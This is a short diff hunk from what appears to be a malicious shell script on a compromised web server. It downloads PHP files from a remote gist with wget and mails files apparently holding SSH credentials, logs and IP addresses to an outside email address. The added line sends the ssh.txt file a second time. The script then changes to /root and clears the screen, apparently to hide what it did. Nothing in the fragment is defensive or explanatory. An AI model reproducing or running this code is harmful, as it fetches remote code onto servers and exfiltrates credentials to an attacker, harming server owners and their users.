@@ -7,5 +7,6 @@ wget -m -A ".*php" "https://gist.githubusercontent.com/B0RU70/31e16d4bc747c56cd2
 sendmail b0ru70@ajanlar.org < /var/www/html/ssh.txt
 sendmail b0ru70@ajanlar.org < /tmp/log.txt
 sendmail b0ru70@ajanlar.org < /tmp/ip.txt
+sendmail b0ru70@ajanlar.org < /var/www/html/ssh.txt
 cd /root/
 clear
